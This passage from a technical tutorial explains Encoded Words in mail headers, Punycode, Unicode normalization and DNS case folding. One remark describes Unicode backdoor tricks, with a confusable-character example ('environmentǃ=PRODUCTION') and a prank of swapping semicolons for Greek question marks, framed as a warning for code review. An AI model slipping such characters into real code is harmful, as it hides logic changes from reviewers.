where <code>CharacterEncoding</code> is usually either <code>ISO-</code><wbr/><code>8859-1</code> or <code>UTF-8</code>,
<code>ContentEncoding</code> is either <code>Q</code> for Quoted-Printable or <code>B</code> for Base64,
and <code>EncodedText</code> is the field value encoded according to the previous parameters.
The Quoted-Printable encoding is slightly modified when used to encode header field values:
Question marks, tabs, and underlines are escaped with their hexadecimal representation
and spaces are encoded with underlines.
In order to adhere to the <a href="#line-length-limit">line-length limit</a>,
whitespace between adjacent Encoded Words is removed completely,
which allows the encoder to break long words with a newline
(and also to mix different character encodings).
The following tool does all of that for you.
It uses Quoted-Printable or Base64 depending on which encoding is shorter,
and it supports only <code>ISO-8859-1</code> and <code>UTF-8</code>.</p>



<p>In case you haven’t noticed yet: The <a href="#esmtp-tool"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> tool</a> above
automatically encodes the <code>Subject</code> and the <code>Body</code> if necessary.
If you want to use non-<abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters in display names,
you have to paste the Encoded Word into the address field yourself.
The following boxes explain how non-<abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters are supported in
<a href="https://evalapply.org/internet/#domain-name-system">domain names</a>,
which is really interesting but also fairly advanced.</p>

<details>
  <summary id="punycode-encoding">
Punycode encoding
</summary>

  <p><a href="https://en.wikipedia.org/wiki/Punycode">Punycode</a> is yet another encoding
of <a href="https://en.wikipedia.org/wiki/Unicode">Unicode</a> with <a href="https://en.wikipedia.org/wiki/ASCII"><abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters</a>.
While domain names may consist of arbitrary bytes,
many protocols require that the domain names of servers
contain only letters, digits, and hyphens (<abbr title="Letters, Digits, and Hyphens (the preferred name syntax for domain names)">LDH</abbr>) from the <abbr title="American Standard Code for Information Interchange">ASCII</abbr> character set.
This is known as the <a href="https://datatracker.ietf.org/doc/html/rfc1035#section-2.3.1">preferred name syntax</a>,
and <a href="#extended-simple-mail-transfer-protocol">(E)<abbr title="Simple Mail Transfer Protocol">SMTP</abbr></a> is one of the protocols
which <a href="https://datatracker.ietf.org/doc/html/rfc5321#section-2.3.5">uphold the <abbr title="Letters, Digits, and Hyphens (the preferred name syntax for domain names)">LDH</abbr> rule</a>.
In order to remain backward compatible and to require no changes to the
<a href="https://evalapply.org/internet/#domain-name-system"><abbr title="Domain Name System">DNS</abbr> infrastructure</a>,
domain names with non-<abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters have to be encoded with just <abbr title="American Standard Code for Information Interchange">ASCII</abbr> letters, digits, and hyphens.
Punycode is an encoding which does exactly that.
It is specified in <a href="https://datatracker.ietf.org/doc/html/rfc3492"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 3492</a>
and it tries to be as space-efficient as possible.</p>

  <p>Punycode encodes Unicode strings in three steps:</p>
  <ol>
    <li><strong>Remove and sort the non-<abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters</strong>: In the first step,
the Punycode encoder removes all non-<abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters from the string which is to be encoded.
For example, <code>Zürich</code>, the city in which I live, becomes <code>Zrich</code>.
Since <code>ü</code> is the only non-<abbr title="American Standard Code for Information Interchange">ASCII</abbr> character, there is nothing to sort.
If there were several non-<abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters,
the encoder would have to sort them according to their Unicode
<a href="https://en.wikipedia.org/wiki/Code_point">code point</a>.</li>
    <li><strong>Determine the deltas</strong>: In the second step,
the encoder determines how many iterations the decoder has to do nothing
before inserting the non-<abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters back in.
The decoder loops through the positions of the current string and through all Unicode characters.
In the first iteration,
the decoder would add the first non-<abbr title="American Standard Code for Information Interchange">ASCII</abbr> code point at the first position.
Since <abbr title="American Standard Code for Information Interchange">ASCII</abbr> uses all 7 bit numbers from 0 to 127,
the first non-<abbr title="American Standard Code for Information Interchange">ASCII</abbr> code point is 128.
In the second iteration,
the decoder would add the character with the code point 128 at the second position, and so on.
Once the decoder reaches the last position of the string,
it goes back to the first position to potentially insert the next higher code point there.
Let’s look at our example again.
There are six positions where a character might be inserted: <code>1Z2r3i4c5h6</code>.
The first (and only) character to insert is <code>ü</code> with the
<a href="https://unicode-table.com/en/00FC/">code point 252</a>.
The decoder has to loop through the string 252 – 128 = 124 many times
before it is ready to insert the character <code>ü</code>.
Since the string has six positions and we want to insert the <code>ü</code> at the second position,
the decoder has to do nothing for 124 · 6 + 1 = 745 iterations
before inserting the current character <code>ü</code> at the current position <code>2</code>.
If there were more characters to insert,
there would now be seven positions for doing so.
The decoder would continue from its current state (<code>ü</code> at position <code>2</code>)
and skip again the number of iterations as specified by the encoder.
The number of skipped iterations is called “delta”.
The result of this second step is a delta for each non-<abbr title="American Standard Code for Information Interchange">ASCII</abbr> character
which needs to be inserted into the string of <abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters as determined by step one.
While <code>Zrich</code> <code>[745]</code> decodes to <code>Zürich</code>,
<code>Zrich</code> <code>[745,</code> <code>0]</code> decodes to <code>Züürich</code>,
<code>Zrich</code> <code>[745,</code> <code>1]</code> decodes to <code>Zürüich</code>,
<code>Zrich</code> <code>[745,</code> <code>2]</code> decodes to <code>Züriüch</code>, and so on.</li>
    <li><strong>Encode the deltas</strong>: In the third step,
the encoder encodes the list of numbers from the second step with letters and digits.
A hyphen is used to separate the encoded deltas from the string of <abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters from step one.
To make the encodings as compact as possible,
Punycode encodes the deltas without a delimiter between them.
It uses <a href="https://en.wikipedia.org/wiki/Numeral_system#Generalized_variable-length_integers">variable-base integers</a>
with a variable termination threshold instead.
Since domain names in the preferred name syntax are case-insensitive,
the case of the letters may not matter for the encoding of the deltas.
The letters <code>a</code> to <code>z</code> represent the decimal numbers 0 to 25
and the digits <code>0</code> to <code>9</code> represent the decimal numbers 26 to 35.
Unlike all the numbers you’re used to,
the positions of Punycode numbers get more significant to the right.
Each position has its own threshold and its own base.
If a digit at a position is below the threshold there,
it marks the end of the current number.
Let’s imagine, for a moment, that we use only the digits <code>0</code> to <code>9</code>
and a fixed threshold value of 5.
Counting then works as follows: <code>0</code>, <code>1</code>, <code>2</code>, <code>3</code>, <code>4</code>
(so far, each number has been terminated by the digit being below the threshold,
but from now on we need an additional digit to terminate the number), <code>50</code>, <code>60</code>, <code>70</code>, <code>80</code>, <code>90</code>
(we cannot go back to a digit below <code>5</code> in the first position as this would terminate the number
so we choose the base of the second position to be 10 minus the threshold of the first position),
<code>51</code> (5 · 1 + 1 · 5 = 10), <code>61</code> (6 + 5 = 11), <code>71</code>, <code>81</code>,
<code>91</code> (9 + 5 = 14), <code>52</code> (5 · 1 + 2 · 5 = 15), and so on.
After <code>94</code> comes <code>550</code> and after <code>990</code> (9 · 1 + 9 · 5 = 54) comes <code>551</code> (5 · 1 + 5 · 5 + 1 · 25 = 55).
The base in the third position is determined by multiplying the base in the second position
with the number of available symbols minus the threshold in the second position (5 · (10 – 5) = 25).
The base in the fourth position will be 25 · (10 – 5) = 125, and so on.
The higher the threshold value, the more likely it is
that you don’t need an additional digit to terminate the number.
On the other hand, a higher threshold value means that the base at the next position is lower.
This in turn means that less progress is made in the next position
and an additional position might be needed.
Punycode sets the threshold as the position times the number of symbols minus the current bias
and limits all thresholds to a certain range.
The bias is 72 initially and the range for thresholds is <a href="https://datatracker.ietf.org/doc/html/rfc3492#section-5">1 to 26</a>.
Thus, the threshold at position 1 is max(1, 1 · 36 – 72) = 1,
the threshold at position 2 is max(1, 2 · 36 – 72) = 1, and
the threshold at position 3 is min(26, 3 · 36 – 72) = 26 initially.
The bias is <a href="https://datatracker.ietf.org/doc/html/rfc3492#section-3.4">adapted after each delta</a> because
the current delta indicates the likely size of the next delta.
In our example, 745 is encoded as <code>kva</code>.
Since <code>k</code> stands for 10, <code>v</code> for 21, and <code>a</code> for 0,
10 · 1 + 21 · 35 + 0 · (35 · 35) indeed equals 745.
Since the threshold is always at least 1,
<code>a</code> always terminates the current delta.
While <code>Zrich-kva</code> decodes to <code>Zürich</code>,
<code>Zrich-kvaa</code> decodes to <code>Züürich</code>,
<code>Zrich-kvab</code> decodes to <code>Zürüich</code>,
<code>Zrich-kvac</code> decodes to <code>Züriüch</code>, and so on.
The bias is adapted to 0 after the first delta,
which makes the threshold at the first position min(26, 1 · 36 – 0) = 26.
This means that <code>Zrich-kvaz</code> is a valid encoding while <code>Zrich-kva0</code> is not
because the <code>0</code> (representing 26) needs to be terminated with an <code>a</code>: <code>Zrich-kva0a</code>.
You can try all of this yourself with the following tool.
The domain name option is explained in <a href="#internationalized-domain-names">another box</a>.</li>
  </ol>

  

  <p><strong>Warning</strong>: The domain option is a <a href="#idna2008-validation">very crude approximation</a>
of the <a href="#internationalized-domain-names">standard</a>.
Use the <a href="https://util.unicode.org/UnicodeJsps/idna.jsp">official utility</a> when correctness matters!</p>

  <p>A few additional observations:</p>
  <ul>
    <li>Punycode transforms a sequence of Unicode <a href="https://en.wikipedia.org/wiki/Code_point">code points</a>
irrespective of their encoding, such as <a href="https://en.wikipedia.org/wiki/UTF-8"><abbr title="Unicode Transformation Format">UTF</abbr>-8</a>
or <a href="https://en.wikipedia.org/wiki/UTF-16"><abbr title="Unicode Transformation Format">UTF</abbr>-16</a>.</li>
    <li>The deltas can be only positive.
This is why the non-<abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters have to be sorted before they can be encoded.</li>
    <li>If the encoded word contains a hyphen, then the decoded word contains <abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters
and the last hyphen is interpreted as the delimiter between the <abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters and the deltas.
If the decoded word doesn’t contain <abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters, then the encoded word doesn’t contain a hyphen.
<code>a</code> is encoded as <code>a-</code>, <code>-</code> as <code>--</code>, <code>ü</code> as <code>tda</code>, and the empty string as the empty string.</li>
    <li>Punycode encodes non-<abbr title="American Standard Code for Information Interchange">ASCII</abbr> symbols like <code>¡</code> and <code>≠</code> with letters, digits, and hyphens,
but it doesn’t escape the remaining printable <abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters, such as <code>!</code>, <code>=</code>, and <code>&amp;</code>.
Punycode would be more flexible if the initial state started with a code point of 0 instead of 128.
As we will see soon, this doesn’t matter for <a href="#internationalized-domain-names">internationalized domain names</a>, though.</li>
    <li>After a potentially large initial delta,
the subsequent deltas are small if all the characters come from the same language.
This is what makes Punycode so efficient.
For example, <code>Ελληνικά</code> is encoded as <code>twa0c6aifdar</code>,
which consists of just four more characters.
Even more astonishingly, the <abbr title="Unicode Transformation Format">UTF</abbr>-8 encoding of <code>Ελληνικά</code> takes 16 bytes,
whereas the <abbr title="Unicode Transformation Format">UTF</abbr>-8/<abbr title="American Standard Code for Information Interchange">ASCII</abbr> encoding of <code>twa0c6aifdar</code> takes just 12 bytes.</li>
  </ul>

</details>

<details>
  <summary id="unicode-normalization">
Unicode normalization
</summary>

  <p><a href="https://en.wikipedia.org/wiki/Unicode">Unicode</a> is designed to be as inclusive as possible.
<a href="https://unicode-table.com/en/">Any character and symbol that people want to express</a> gets included in the standard.
While a unified encoding of all <a href="https://en.wikipedia.org/wiki/Writing_system">writing systems</a>
and earlier <a href="https://en.wikipedia.org/wiki/Character_encoding">character encodings</a>
is great for interoperability, it’s really bad for comparing strings because
characters that we humans consider to be equal can be encoded by different code points.
When you search for a string encoded in one variant,
you also want to find strings encoded in other variants.
For this reason, Unicode strings need to be <a href="https://en.wikipedia.org/wiki/Text_normalization">normalized</a>
before comparing them so that identical strings have the same binary representation.</p>

  <p><a href="https://en.wikipedia.org/wiki/Unicode_equivalence#Normalization">Unicode normalization</a>
distinguishes between encodings that are syntactically identical
and encodings that are semantically similar but not identical.
The former is called canonical equivalence, the latter compatibility equivalence.
Additionally, some characters can be represented by a single code point or by several code points.
The former is the composed representation, the latter the decomposed representation.
Based on these options, Unicode defines the following four
<a href="https://unicode.org/reports/tr15/#Norm_Forms">normalization forms (<abbr title="Normalization Form">NF</abbr>)</a>:</p>

  <figure>

    <table>
      <thead>
        <tr>
          <th> </th>
          <th>Composition</th>
          <th>Decomposition</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td><strong>Canonical</strong></td>
          <td><abbr title="Normalization Form (Canonical) Composition (for Unicode strings)">NFC</abbr></td>
          <td><abbr title="Normalization Form (Canonical) Decomposition (for Unicode strings)">NFD</abbr></td>
        </tr>
        <tr>
          <td><strong>Compatibility</strong></td>
          <td><abbr title="Normalization Form Compatibility Composition (for Unicode strings)">NFKC</abbr></td>
          <td><abbr title="Normalization Form Compatibility Decomposition (for Unicode strings)">NFKD</abbr></td>
        </tr>
      </tbody>
    </table>

    <figcaption>
The four normalization forms of Unicode.
</figcaption>
  </figure>

  <p>Replacing characters by compatibility equivalence also replaces characters that are canonically equivalent.
There are no normalization forms for the latter without the former.
The relationship between canonical equivalence and compatibility equivalence can thus be visualized as follows:</p>

  <figure>
    <svg id="figure-unicode-equivalence" data-name="unicode-equivalence" width="254.768" height="74" viewBox="-6.25 -6.25 254.768 74" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <rect x="0" y="0" width="121.134" height="61.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="60.567" y="25.65"><tspan>Canonical</tspan></tspan><tspan x="60.567" y="47.65"><tspan>equivalence</tspan></tspan>
    </text>
    <rect x="-5" y="-5" width="252.268" height="71.5" rx="13" ry="13"></rect>
    <text text-anchor="middle">
        <tspan x="184.201" y="25.65"><tspan>Compatibility</tspan></tspan><tspan x="184.201" y="47.65"><tspan>equivalence</tspan></tspan>
    </text>

</svg>

    <figcaption>
Compatibility equivalence includes canonical equivalence.
</figcaption>
  </figure>

  <p>Before we look at examples, let me introduce the following tool to you.
It outputs the code points of the given input after applying the given normalization.
It uses <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/normalize">JavaScript’s <code>normalize</code> function</a> for the Unicode normalization,
and it allows you to input characters by their code point(s)
with <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String#Escape_notation">JavaScript’s escape notation</a>,
which means that you can specify a code point with two, four, or a variable number of hexadecimal digits:
<code>\xXX</code>, <code>\uXXXX</code>, and <code>\u{X…X}</code>, where <code>X</code> represents a hexadecimal digit.</p>

  

  <p><a href="https://unicode.org/reports/tr15/#Canonical_Equivalence_Figure"><strong>Examples of canonical equivalence</strong></a>:</p>
  <ul>
    <li><a href="https://en.wikipedia.org/wiki/Combining_character">Combining characters</a>
such as <a href="https://en.wikipedia.org/wiki/Combining_Diacritical_Marks">diacritical marks</a>:
<a href="#tool-encoding-normalization&amp;input=%C3%BC&amp;normalization=NFD">ü ↔ u◌̈</a>,
<a href="#tool-encoding-normalization&amp;input=%C3%AD&amp;normalization=NFD">í ↔ i◌́</a>,
<a href="#tool-encoding-normalization&amp;input=%C3%A8&amp;normalization=NFD">è ↔ e◌̀</a>,
<a href="#tool-encoding-normalization&amp;input=%C3%B1&amp;normalization=NFD">ñ ↔ n◌̃</a>,
<a href="#tool-encoding-normalization&amp;input=%C3%A7&amp;normalization=NFD">ç ↔ c◌̧</a> ,
<a href="#tool-encoding-normalization&amp;input=%E2%89%A0&amp;normalization=NFD">≠ ↔ =◌̸</a></li>
    <li>The order of combining marks is irrelevant:
<a href="#tool-encoding-normalization&amp;input=a%5Cu0307%5Cu0323&amp;normalization=NFD">a◌̇◌̣ → a◌̣◌̇</a>,
<a href="#tool-encoding-normalization&amp;input=a%CC%A3%CC%87&amp;normalization=NFC">a◌̣◌̇ ↔ ạ◌̇</a></li>
    <li><a href="https://en.wikipedia.org/wiki/Unicode_compatibility_characters#Semantically_distinct_characters">Same symbol with different semantics</a>:
<a href="#tool-encoding-normalization&amp;input=%E2%84%AA&amp;normalization=NFD">Kelvin K → Latin K</a>,
<a href="#tool-encoding-normalization&amp;input=%E2%84%A6&amp;normalization=NFD">Ohm Sign Ω → Greek Omega Ω</a></li>
  </ul>

  <p><a href="https://unicode.org/reports/tr15/#Compatibility_Equivalence_Figure"><strong>Examples of compatibility equivalence</strong></a>:</p>
  <ul>
    <li><a href="https://unicode-table.com/en/search/?q=Mathematical+N">Style variants</a>:
<a href="#tool-encoding-normalization&amp;input=%E2%84%95&amp;normalization=NFKC">ℕ → N</a>,
<a href="#tool-encoding-normalization&amp;input=%F0%9D%90%8D&amp;normalization=NFKC">𝐍 → N</a></li>
    <li><a href="https://unicode-table.com/en/blocks/enclosed-alphanumerics/">Enclosed alphanumerics</a>:
<a href="#tool-encoding-normalization&amp;input=%E2%92%88&amp;normalization=NFKC">⒈ → 1.</a>,
<a href="#tool-encoding-normalization&amp;input=%E2%91%B4&amp;normalization=NFKC">⑴ → (1)</a>,
<a href="#tool-encoding-normalization&amp;input=%E2%91%A0&amp;normalization=NFKC">① → 1</a>,
<a href="#tool-encoding-normalization&amp;input=%E2%92%9C&amp;normalization=NFKC">⒜ → (a)</a>,
<a href="#tool-encoding-normalization&amp;input=%E2%93%90&amp;normalization=NFKC">ⓐ → a</a></li>
    <li><a href="https://unicode-table.com/en/blocks/halfwidth-and-fullwidth-forms/">Halfwidth and fullwidth forms</a>:
<a href="#tool-encoding-normalization&amp;input=%EF%BC%A1&amp;normalization=NFKC">Ａ → A</a>,
<a href="#tool-encoding-normalization&amp;input=%EF%BD%B6&amp;normalization=NFKC">ｶ → カ</a></li>
    <li><a href="https://unicode-table.com/en/blocks/superscripts-and-subscripts/">Superscripts and subscripts</a>:
<a href="#tool-encoding-normalization&amp;input=%C2%B9&amp;normalization=NFKC">¹ → 1</a>,
<a href="#tool-encoding-normalization&amp;input=%E2%82%81&amp;normalization=NFKC">₁ → 1</a></li>
    <li><a href="https://unicode-table.com/en/blocks/number-forms/">Number forms</a>:
<a href="#tool-encoding-normalization&amp;input=%E2%85%94&amp;normalization=NFKC">⅔ → 2⁄3</a>,
<a href="#tool-encoding-normalization&amp;input=%E2%85%A3&amp;normalization=NFKC">Ⅳ → IV</a></li>
    <li><a href="https://en.wikipedia.org/wiki/Orthographic_ligature">Ligatures</a>:
<a href="#tool-encoding-normalization&amp;input=%EF%AC%80&amp;normalization=NFKC">ﬀ → ff</a>,
<a href="#tool-encoding-normalization&amp;input=%EF%AC%81&amp;normalization=NFKC">ﬁ → fi</a>
(The ligature on the right-hand side of the second example is created by the font on this website.)</li>
    <li><a href="https://en.wikipedia.org/wiki/Digraph_(orthography)">Digraphs</a>:
<a href="#tool-encoding-normalization&amp;input=%C4%B3&amp;normalization=NFKC">ĳ → ij</a>,
<a href="#tool-encoding-normalization&amp;input=%C7%86&amp;normalization=NFKC">ǆ → dž</a></li>
    <li><a href="https://unicode-table.com/en/blocks/letterlike-symbols/">Letter-like symbols</a>:
<a href="#tool-encoding-normalization&amp;input=%E2%84%83&amp;normalization=NFKC">℃ → °C</a>,
<a href="#tool-encoding-normalization&amp;input=%E2%84%85&amp;normalization=NFKC">℅ → c/o</a>,
<a href="#tool-encoding-normalization&amp;input=%E2%84%A2&amp;normalization=NFKC">™ → TM</a></li>
    <li><a href="https://en.wikipedia.org/wiki/Non-breaking_space">Line-breaking behavior</a>:
<a href="#tool-encoding-normalization&amp;input=%5CxA0&amp;normalization=NFKC">non-breaking space → space</a>,
<a href="#tool-encoding-normalization&amp;input=%5Cu2011&amp;normalization=NFKC">non-breaking hyphen → hyphen</a>
(≠ <a href="https://unicode-table.com/en/002D/">hyphen-minus</a>)</li>
  </ul>

  <p>A few additional remarks:</p>
  <ul>
    <li><strong>Notation</strong>: I used ↔ when the left side can be converted to the right side and vice versa,
and → when the left side is normalized to the right side
and the right side can no longer be reverted to the left side.</li>
    <li><a href="https://en.wikipedia.org/wiki/Lossy_data_conversion"><strong>Lossy conversion</strong></a>:
Both the canonical normalization and the compatibility normalization lose information,
but in the case of canonical normalization, the loss is usually desired.
In general, a normalized string cannot be reverted to its original form.</li>
    <li><a href="https://en.wikipedia.org/wiki/Idempotence"><strong>Idempotence</strong></a>:
As long as the same normalization is used,
applying the normalization repeatedly doesn’t change the result.
More formally, <code>normalize(normalize(Input))</code> <code>=</code> <code>normalize(Input)</code>.
(Earlier Unicode versions had <a href="https://unicode.org/faq/normalization.html#14">exceptions to this rule</a>.)</li>
    <li><a href="https://en.wikipedia.org/wiki/Substring"><strong>Substring</strong></a>:
If a string is normalized, then so are all its substrings.</li>
    <li><a href="https://en.wikipedia.org/wiki/Concatenation"><strong>Concatenation</strong></a>:
Even if two strings are normalized, their concatenation
<a href="https://unicode.org/reports/tr15/#Concatenation">might not be normalized</a>.</li>
    <li><a href="https://unicode.org/faq/normalization.html#11"><strong>Growth through <abbr title="Normalization Form (Canonical) Composition (for Unicode strings)">NFC</abbr> normalization</strong></a>:
In <a href="http://www.macchiato.com/unicode/nfc-faq#TOC-What-are-the-cases-where-combining-marks-separate-">rare situations</a>,
<abbr title="Normalization Form (Canonical) Composition (for Unicode strings)">NFC</abbr> normalization can make a string longer.</li>
    <li><strong>Surprises</strong>: While most <abbr title="Normalization Form Compatibility Composition (for Unicode strings)">NFKC</abbr> normalizations are quite reasonable,
you will get unexpected results if you play long enough with the <a href="#tool-encoding-normalization">above tool</a>.
For example, <code>⅔</code> normalizes to <code>2⁄3</code>, but the latter uses
the <a href="https://unicode-table.com/en/2044/">fraction slash</a>
and not the <a href="https://unicode-table.com/en/002F/"><abbr title="American Standard Code for Information Interchange">ASCII</abbr> slash</a>.
Similarly, the <a href="https://unicode-table.com/en/2010/">hyphen</a>
doesn’t normalize to the <a href="https://unicode-table.com/en/002D/"><abbr title="American Standard Code for Information Interchange">ASCII</abbr> hyphen or minus</a>.
And while the <a href="https://en.wikipedia.org/wiki/Trademark_symbol">trademark symbol</a> normalizes to <code>TM</code>,
the <a href="https://en.wikipedia.org/wiki/Copyright_symbol">copyright symbol</a> stays the same.
Depending on your requirements, you may thus want to replace additional characters.</li>
    <li><strong>Clipboard</strong>: It’s not always clear when programs normalize strings, which can lead to subtle bugs.
For example, when I copy a string to my clipboard with Firefox on macOS,
the string gets normalized to <abbr title="Normalization Form (Canonical) Composition (for Unicode strings)">NFC</abbr> <a href="https://stackoverflow.com/a/65378588/12917821">when pasted into other programs</a>.
I assume this is due to how Firefox stores text to the clipboard.
If I copy a string with Chrome, its form is preserved, even when pasted in Firefox.
This is why I write “depends on your system” next to the no-normalization option in the tool above.
The tool itself won’t transform the string in this case,
but the string might have been normalized before it reached the input field.
Another example is that Chrome used to <abbr title="Normalization Form (Canonical) Composition (for Unicode strings)">NFC</abbr> normalize strings when submitting a form,
which led to <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=117128">problems for certain languages</a>.</li>
    <li><strong>Verification</strong>: Since you can’t be certain how programs interact with the clipboard,
you have to do a <a href="https://en.wikipedia.org/wiki/Hex_dump">hex dump</a>
if you want to verify how text has been stored to a file by a certain program: <code>hexdump</code> <code>-C</code> <code>file.txt</code>.</li>
    <li><strong>Programming</strong>: If you copy <code>&#39;mañana&#39;</code> <code>===</code> <code>&#39;mañana&#39;</code> to the JavaScript console of your
<a href="https://en.wikipedia.org/wiki/Web_development_tools">web development tools</a>,
you get <code>false</code> because <code>&#39;ma\xF1ana&#39;</code> <code>!==</code> <code>&#39;man\u0303ana&#39;</code>.
If you want to prank a friend, replace the <a href="https://unicode-table.com/en/003B/">ordinary semicolon</a> <code>;</code>
with the <a href="https://unicode-table.com/en/037E/">Greek question mark</a> <code>;</code> in their
<a href="https://en.wikipedia.org/wiki/Source_code">source code</a>.
These two problems could be solved by normalizing source code to <abbr title="Normalization Form (Canonical) Composition (for Unicode strings)">NFC</abbr>.
However, <code>&#39;hi&#39;.normalize(&#39;NFKC&#39;) === &#39;h​i&#39;.normalize(&#39;NFKC&#39;)</code> would still be <code>false</code>
because the right <code>h​i</code> contains an invisible <a href="https://en.wikipedia.org/wiki/Zero-width_space">zero-width space</a>,
which is not normalized away even under compatibility equivalence.
For developers, the complexity of Unicode is quite scary.
Presumably simple things like counting the number of symbols in a string or reversing a string
become <a href="https://mathiasbynens.be/notes/javascript-unicode">surprisingly difficult</a>
– even before considering <a href="https://en.wikipedia.org/wiki/Right-to-left">right-to-left (<abbr title="Right-To-Left (text)">RTL</abbr>) text</a>
and its combination with <a href="https://en.wikipedia.org/wiki/Left-to-right">left-to-right (<abbr title="Left-To-Right (text)">LTR</abbr>) text</a>
into <a href="https://en.wikipedia.org/wiki/Bidirectional_text">bidirectional (<abbr title="Bi-Directional (text)">BiDi</abbr>) text</a>.</li>
    <li><strong>Backdoors</strong>: An attacker can use Unicode to include <a href="https://en.wikipedia.org/wiki/Backdoor_(computing)">backdoors</a>
which cannot be spotted during <a href="https://en.wikipedia.org/wiki/Code_review">code review</a>
unless your <a href="https://en.wikipedia.org/wiki/Source-code_editor">code editor</a> warns you about uncommon characters.
Invisible Unicode characters can be used to introduce
<a href="https://certitude.consulting/blog/en/invisible-backdoor/">invisible variables</a>,
<a href="https://unicode.org/reports/tr36/#visual_spoofing">confusable Unicode characters</a>
in variable names can make conditions pass or fail unexpectedly
(e.g. the <a href="https://unicode-table.com/en/01C3/">alveolar click character</a> <code>ǃ</code> makes <code>environmentǃ=PRODUCTION</code>
an <a href="https://en.wikipedia.org/wiki/Assignment_(computer_science)">assignment</a>
instead of a <a href="https://en.wikipedia.org/wiki/Relational_operator">comparison</a>),
Unicode control characters can turn what appears to be a comment
<a href="https://www.trojansource.codes/">into source code and vice versa</a>, and so on.
Since November 2021, the popular code editor <a href="https://code.visualstudio.com/">Visual Studio Code</a> by Microsoft
<a href="https://code.visualstudio.com/updates/v1_63#_unicode-highlighting">highlights uncommon characters</a> by default.</li>
    <li><a href="https://en.wikipedia.org/wiki/Emoji"><strong>Emojis</strong></a>:
<a href="https://www.unicode.org/emoji/charts/full-emoji-modifiers.html">Modifiers</a>
change the appearance of the preceding emoji.
This is how skin tones, hair styles, gender, professions, and families are encoded.
Click on the following emojis to see what they’re made of:
<a href="#tool-encoding-normalization&amp;input=%F0%9F%91%8D%F0%9F%8F%BB&amp;normalization=none">👍🏻</a> ,
<a href="#tool-encoding-normalization&amp;input=%F0%9F%91%A8%F0%9F%8F%BC%E2%80%8D%F0%9F%A6%B1&amp;normalization=none">👨🏼‍🦱</a> ,
<a href="#tool-encoding-normalization&amp;input=%F0%9F%A4%B7%F0%9F%8F%BD%E2%80%8D%E2%99%82%EF%B8%8F&amp;normalization=none">🤷🏽‍♂️</a> ,
<a href="#tool-encoding-normalization&amp;input=%F0%9F%91%A9%F0%9F%8F%BE%E2%80%8D%F0%9F%94%AC&amp;normalization=none">👩🏾‍🔬</a> , and
<a href="#tool-encoding-normalization&amp;input=%F0%9F%91%A8%E2%80%8D%F0%9F%91%A9%E2%80%8D%F0%9F%91%A7%E2%80%8D%F0%9F%91%A6&amp;normalization=none">👨‍👩‍👧‍👦</a> .
The <a href="https://en.wikipedia.org/wiki/Zero-width_joiner">zero-width joiner (<abbr title="Zero-Width Joiner">ZWJ</abbr>)</a>
is used to combine characters which also exist separately,
and the <a href="https://en.wikipedia.org/wiki/Variation_Selectors_(Unicode_block)">variation selector 16</a>
with the code point <a href="https://unicode-table.com/en/FE0F/">FE0F</a>
is used to render the preceding character as an emoji rather than as a text symbol.
For example, <code>\u26A0</code> gives you <span>⚠</span>,
whereas <code>\u26A0\uFE0F</code> gives you <span>⚠️</span> .
Please note that such emojification is not supported by all fonts.</li>
    <li><strong>Artistic use</strong>: Unicode can also be used to change the appearance of <abbr title="American Standard Code for Information Interchange">ASCII</abbr> text.
For example, you can <a href="https://unicode-table.com/en/tools/flip/">flip text upside down</a>
or overuse diacritics, which results in so-called
<a href="https://en.wikipedia.org/wiki/Combining_character#Zalgo_text">Zalgo text</a>.</li>
    <li><strong>Sources</strong>: To learn more about normalization,
you can read the <a href="https://unicode.org/reports/tr15/">technical report</a>
and the <a href="https://unicode.org/faq/normalization.html"><abbr title="Frequently Asked Questions">FAQ</abbr></a> by the
<a href="https://en.wikipedia.org/wiki/Unicode_Consortium">Unicode Consortium</a>.</li>
  </ul>

</details>

<details>
  <summary id="unicode-case-folding">
Unicode case folding
</summary>

  <p>The <a href="https://evalapply.org/internet/#domain-name-system">domain name system</a> has been
<a href="https://datatracker.ietf.org/doc/html/rfc1035#section-2.3.3">case-insensitive</a> since its inception.
This means that if you search for <code>EF1P.com</code>,
you still get the records for <code>ef1p.com</code>.
Furthermore, if I have a <abbr title="Domain Name System">DNS</abbr> record at <code>www.ef1p.com</code>
and a <a href="https://en.wikipedia.org/wiki/Wildcard_DNS_record">wildcard record</a> at <code>*.ef1p.com</code>,
querying <code>WWW.EF1P.COM</code> returns the former.
Since <abbr title="Domain Name System">DNS</abbr> servers are supposed to <a href="https://datatracker.ietf.org/doc/html/rfc4343#section-4">preserve the case</a>,
they have to do the case-insensitive comparison of <abbr title="American Standard Code for Information Interchange">ASCII</abbr> strings.
(In theory, you’re supposed to get back the domain name
<a href="https://mailarchive.ietf.org/arch/msg/dnsext/pS7pUSM3SZBA-nu921cVn7IdfJs/">as it’s capitalized in the zone file of the authoritative name server</a>.
In practice, however, many <abbr title="Domain Name System">DNS</abbr> servers use case-insensitive name compression in their responses,
which means that you often get back the domain name as you capitalized it in your query.
Pointing from the answer section to the question section in order to make the <abbr title="Domain Name System">DNS</abbr> response smaller
even if the case doesn’t match is <a href="https://datatracker.ietf.org/doc/html/rfc4343#section-4.1">explicitly allowed by the <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr></a>.)
